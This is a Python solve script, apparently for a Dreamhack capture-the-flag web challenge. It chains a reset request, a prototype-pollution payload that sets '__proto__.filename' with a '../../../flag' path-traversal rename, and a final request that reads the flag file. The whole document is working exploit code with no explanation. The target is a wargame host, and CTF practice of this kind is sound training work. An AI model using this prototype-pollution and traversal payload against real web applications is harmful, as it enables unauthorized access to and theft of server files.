import requests

url = "http://host8.dreamhack.games:19979"

def reset():
    r = requests.get(f"{url}/test?func=reset")
    print(f"[+] Reset: ", r.text)
def prototype_pollution():
    payload="/test?func=rename&filename=__proto__.filename&&rename=../../../flag"
    r = requests.get(url + payload)
    print(f"[+] ProtoType_Pollution: ", r.text)
def readFlag():
    r = requests.get(f"{url}/readfile")
    print(f"[+] DONE FLAG: ", r.text)
def main():
    reset()
    prototype_pollution()
    readFlag()
if __name__ == "__main__":
    main()